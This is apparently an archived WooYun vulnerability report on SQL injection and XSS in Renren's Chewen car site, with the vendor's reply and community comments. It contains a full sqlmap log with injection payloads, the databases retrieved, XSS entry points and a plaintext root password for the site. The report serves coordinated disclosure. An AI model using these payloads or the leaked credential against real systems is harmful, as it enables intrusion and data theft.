{"id": 589, "wybug_id": "wooyun-2014-074990", "wybug_title": "人人网旗下车问网SQL注入与XSS漏洞（可跨多个数据库，root以破解出来）", "wybug_corp": "人人网", "wybug_author": "Mosuan", "wybug_date": "2014-09-04 11:30", "wybug_open_date": "2014-10-19 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向公众公开  简要描述： rt 详细说明：  \n注入地址:http://dealer.chewen.com/1172/active/?carModelId=1521    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:50:04[10:50:04] [INFO] using 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\dealer.chewen.com\\session' as session file[10:50:04] [INFO] testing connection to the target url[10:50:04] [INFO] testing if the url is stable, wait a few seconds[10:50:06] [INFO] url is stable[10:50:06] [INFO] testing if GET parameter 'carModelId' is dynamic[10:50:06] [INFO] confirming that GET parameter 'carModelId' is dynamic[10:50:06] [INFO] GET parameter 'carModelId' is dynamic[10:50:06] [INFO] heuristic test shows that GET parameter 'carModelId' might beinjectable (possible DBMS: MySQL)[10:50:06] [INFO] testing sql injection on GET parameter 'carModelId'[10:50:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:50:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:50:08] [INFO] GET parameter 'carModelId' is 'MySQL >= 5.0 AND error-based -WHERE or HAVING clause' injectable[10:50:08] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:50:08] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:50:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:50:11] [INFO] target url appears to be UNION injectable with 1 columns[10:50:11] [INFO] GET parameter 'carModelId' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectableGET parameter 'carModelId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 25 HTTP(s) requests:---Place: GETParameter: carModelId    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: carModelId=1521 AND (SELECT 7726 FROM(SELECT COUNT(*),CONCAT(0x3a7466793a,(SELECT (CASE WHEN (7726=7726) THEN 1 ELSE 0 END)),0x3a76716d3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: carModelId=1521 UNION ALL SELECT CONCAT(0x3a7466793a,0x4848504d4a70464a7a4a,0x3a76716d3a)#---[10:50:21] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, JSPback-end DBMS: MySQL 5.0[10:50:21] [INFO] fetching database names[10:50:21] [INFO] the SQL query used returns 10 entries[10:50:21] [INFO] retrieved: \"information_schema\"[10:50:21] [INFO] retrieved: \"autodata\"[10:50:22] [INFO] retrieved: \"bitnami_roller\"[10:50:22] [INFO] retrieved: \"chewen\"[10:50:22] [INFO] retrieved: \"chewen_bbs\"[10:50:22] [INFO] retrieved: \"chewen_task\"[10:50:23] [INFO] retrieved: \"chewen_user\"[10:50:23] [INFO] retrieved: \"mysql\"[10:50:23] [INFO] retrieved: \"syspoll\"[10:50:23] [INFO] retrieved: \"test\"available databases [10]:[*] autodata[*] bitnami_roller[*] chewen[*] chewen_bbs[*] chewen_task[*] chewen_user[*] information_schema[*] mysql[*] syspoll[*] test[10:50:23] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\dealer.chewen.com'[*] shutting down at 10:50:23\n\nhttp://dealer.chewen.com/1306/ask/   这里提问个问题插入xss code\n\n\n\nhttp://www.chewen.com/s?q=alert&t=   搜索alert，前人弄得xss未修复\n\nroot：shenghuomeihao\n可沦陷多个后台，site:chewen.com  就能找到很多你们的后台了，这里给你们留点脸，点到为止，求rank   漏洞证明：  public   修复方案：  过滤，转义，改密码   版权声明：转载请注明来源 Mosuan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-04 13:00 厂商回复： 早上别的白帽子刚刚提交过了，为防止马甲刷分，只能给个低等的分数了，不好意思啦，见谅。还是很感谢，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 11:35 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  首页了    \n     2014-09-04 11:38 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @浮萍 几个月了，终于首页了.....    \n     2014-09-04 11:49 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @Mosuan 继续努力~~    \n     2014-09-04 11:53 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  有意思吗？  随便一扫一大堆  deal的注入~    \n     2014-09-04 11:58 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @爱上平顶山 我怎么发现你说话好搞笑？什么叫有意思吗？难道我在刷洞吗？一大堆就不是漏洞了吗？别把话说的那么死，你也可以提交！    \n     2014-09-04 12:04 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @爱上平顶山 得罪了，大牛    \n     2014-09-04 13:35 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @人人网 我没刷分....我在wooyun只有一个马甲    \n     2014-09-04 13:39 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @爱上平顶山 。。。那不是一不小心就给全部del了    \n     2014-09-04 13:40 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @Mosuan 不是啊  是一个洞 其他的顺带他们会修复  没必要    \n     2014-09-04 14:13 |    \t\t人人网(乌云厂商)\t\t \n  @Mosuan 只是为了防止重复提交，并没有说是你刷分，误会了。PS:车问的东西找不到维护的人，处境很尴尬，多多包涵。    \n     2014-09-04 14:42 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @人人网 可以兼职维护吗？哈哈哈，能理解。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}